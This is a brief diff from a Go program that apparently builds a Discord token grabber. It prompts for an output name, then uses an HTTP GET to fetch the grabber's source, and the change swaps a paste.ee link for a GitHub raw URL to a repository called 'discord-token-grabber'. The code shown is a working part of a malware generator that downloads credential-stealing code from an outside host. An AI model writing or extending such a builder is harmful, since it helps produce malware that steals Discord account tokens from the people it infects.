@@ -28,8 +28,8 @@ func main() {
 	fmt.Scanln(&outputName)
 	fmt.Println(" -------------------------- ")
 	fmt.Println("\n # Initializing generation")
-	fmt.Println(" * Executing HTTP GET")
-	resp, err := http.Get("https://paste.ee/r/QOrx9") // in order to reduce the code length
+	fmt.Println("\n * Executing HTTP GET")
+	resp, err := http.Get("https://raw.githubusercontent.com/pedrokpp/discord-token-grabber/main/main.go")
 
 	if err != nil {
 		log.Fatal(" ! Error while trying to HTTP GET -> ", err)
